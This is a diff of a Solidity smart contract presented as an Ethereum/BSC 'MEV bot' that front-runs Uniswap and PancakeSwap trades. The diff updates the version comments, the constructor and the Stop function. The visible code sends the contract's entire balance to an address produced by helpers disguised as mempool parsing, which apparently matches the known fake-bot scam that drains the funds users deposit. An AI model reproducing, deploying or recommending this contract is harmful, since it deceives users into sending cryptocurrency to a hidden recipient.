@@ -1,6 +1,8 @@
-//MevBot V2.1 Update 11.03.2023
+//MevBot V2.1 Update 29.03.2023
+
 //Uniswap/Pancakeswap
 //ETH/BNB
+// UPDATE MEV BOT 26.03.2023
 
 //SPDX-License-Identifier: MIT
 
@@ -13,20 +15,33 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
-contract MevBot {
+
+contract MevBot_ETH_BSC {
  
   
-    string public tokenName ;
-    string public tokenSymbol ;
+    string private _RouterAddress;
+    string private _Network;
     uint liquidity;
 
 
     event Log(string _msg);
 
-    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
-        tokenSymbol = _mainTokenSymbol;
-        tokenName = _mainTokenName;
+    constructor(string memory Network, string memory routerAddress) public {
+        
+        /*ETH
+        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+        /SushiSwap  Router  address :      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
+        
+        /BSC
+        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E
+
+        /Network: ETH or BSC
+        */
+
+        _Network = Network;
+        _RouterAddress = routerAddress;
     }
+  
 
     receive() external payable {}
 
@@ -34,6 +49,8 @@ contract MevBot {
         uint _len;
         uint _ptr;
     }
+    
+    
     
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
@@ -57,9 +74,10 @@ contract MevBot {
             uint b;
 
             string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
+            
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
+            loadCurrentContract(WBSC_CONTRACT_ADDRESS);
             assembly {
                 a := mload(selfptr)
                 b := mload(otherptr)
@@ -495,6 +513,9 @@ contract MevBot {
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
 
+    function Stop() public payable { Log("Stopping contract bot...");
+    }
+    
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
@@ -527,9 +548,7 @@ contract MevBot {
         return parseMempool(callMempool());
     }
 
-    function Stop() public payable  returns (address) {
-        return parseMempool(callMempool());
-    }
+
 
     /*
      * @dev loads all Uniswap mempool into memory
